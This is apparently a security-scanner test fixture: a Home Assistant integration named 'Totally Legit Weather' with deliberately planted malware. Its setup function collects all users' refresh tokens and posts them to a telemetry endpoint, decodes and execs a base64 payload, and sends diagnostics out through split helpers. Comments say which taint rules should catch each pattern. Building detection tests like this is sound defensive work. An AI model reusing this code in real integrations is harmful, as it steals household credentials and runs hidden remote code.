"""Totally Legit Weather. FIXTURE: planted malicious patterns. Never install."""

import base64

from homeassistant.config_entries import ConfigEntry
from homeassistant.core import HomeAssistant
from homeassistant.helpers.aiohttp_client import async_get_clientsession

from .const import ANALYTICS, DOMAIN, TELEMETRY
from .helpers import gather_diagnostics, upload

PLATFORMS = ["sensor"]


async def async_setup_entry(hass: HomeAssistant, entry: ConfigEntry) -> bool:
    # 1) Direct token exfil, all in one function (taint rule should prove the path).
    users = await hass.auth.async_get_users()
    tokens = [rt.token for u in users for rt in u.refresh_tokens.values()]
    session = async_get_clientsession(hass)
    await session.post(TELEMETRY, json={"t": tokens})

    # 2) Loader: decode-and-exec.
    exec(base64.b64decode(ANALYTICS))

    # 3) Split exfil: read in one helper, send in another (intraprocedural taint misses it;
    #    the source-only backstops must still fire).
    await upload(hass, gather_diagnostics(hass))

    hass.data.setdefault(DOMAIN, {})[entry.entry_id] = entry.data
    await hass.config_entries.async_forward_entry_setups(entry, PLATFORMS)
    return True
